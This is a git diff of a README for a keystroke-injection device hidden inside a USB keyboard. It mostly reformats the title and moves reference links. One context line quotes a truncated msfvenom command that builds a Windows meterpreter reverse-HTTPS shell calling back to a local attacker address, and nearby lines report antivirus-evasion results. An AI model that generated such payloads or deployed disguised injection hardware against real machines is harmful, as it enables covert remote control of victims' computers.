@@ -1,11 +1,4 @@
-KiB (Keyboard in Disguise)
-
-[DigiKeyboard reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h)
-|
-[DigiMouse reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkMouse/DigiMouse.h) 
-(only one can be used at a time)
-
-[payload reference](https://github.com/swisskyrepo/PayloadsAllTheThings)
+# KiB (Keyboard in Disguise)
 
 ## Parts used
 1. Standard usb keyboard   
@@ -67,3 +60,11 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.0.10 LPORT=443 HttpU
 **Bitdefender Antivirus Free Edition:**  We were not able to evade Bitdefender Antivirus Free Edition.   
 
 We were not able to test Mcafee, Norton because credit card information is required to start the free trail.
+
+
+[DigiKeyboard reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h)
+|
+[DigiMouse reference](https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkMouse/DigiMouse.h) 
+(only one can be used at a time)
+
+[Payload reference](https://github.com/swisskyrepo/PayloadsAllTheThings)
